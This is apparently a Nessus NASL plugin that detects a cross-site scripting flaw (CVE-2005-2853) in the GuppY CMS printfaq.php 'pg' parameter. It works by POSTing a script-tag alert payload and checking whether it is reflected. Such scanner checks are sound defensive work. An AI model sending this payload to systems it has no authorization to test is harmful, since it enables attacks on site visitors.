#
# Josh Zlatin-Amishav (josh at ramat dot cc)
# GPLv2
#


if (description) {
  script_id(19942);
  script_cve_id("CVE-2005-2853");
  script_bugtraq_id(14752, 14984);
  script_version("$Revision: 1.3 $");

  name["english"] = "GuppY pg Parameter Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is prone to cross-site
scripting and possibly directory traversal attacks.

Description :

The remote host is running GuppY / EasyGuppY, a CMS written in PHP. 

The version of Guppy / EasyGuppY installed on the remote host fails to
sanitize user-supplied input to the 'pg' field in the 'printfaq.php'
script.  An attacker can exploit this flaw to launch cross-site
scripting and possibly directory traversal attacks against the affected
application. 

See also :

http://archives.neohapsis.com/archives/bugtraq/2005-09/0362.html

Solution : 

Upgrade to version 4.5.6a or later.

Risk factor : 

Low / CVSS Base Score : 2 
(AV:R/AC:H/Au:NR/C:P/A:N/I:N/B:N)"; 

  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for pg parameter flaw in Guppy";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"(C) 2005 Josh Zlatin-Amishav");

  script_dependencie("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);

# A simple alert.
xss = "<script>alert('" + SCRIPT_NAME + "');</script>";
# nb: the url-encoded version is what we need to pass in.
exss = urlencode(str:xss);

foreach dir ( cgi_dirs() )
{
  # Make sure the affected script exists.
  req = http_get(item:string(dir, "/printfaq.php?lng=en&pg=1"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does and looks like GuppY...
  if ("<title>GuppY - " >< res) {
    # Try to exploit the flaw.
    #
    # nb: we'll use a POST since 4.5.5 prevents GETs from working but
    #     still allows us to pass data via POSTs and cookies. Also, we
    #     check for the XSS rather than try to read an arbitrary file
    #     since the latter doesn't work with 4.5.5 except under Windows.
    postdata = string(
      'pg=', exss
    );
    req = string(
      "POST /", dir, "/printfaq.php HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);
    
    if ( xss >< res )
    {
        security_note(port);
        exit(0);
    }
  }
}
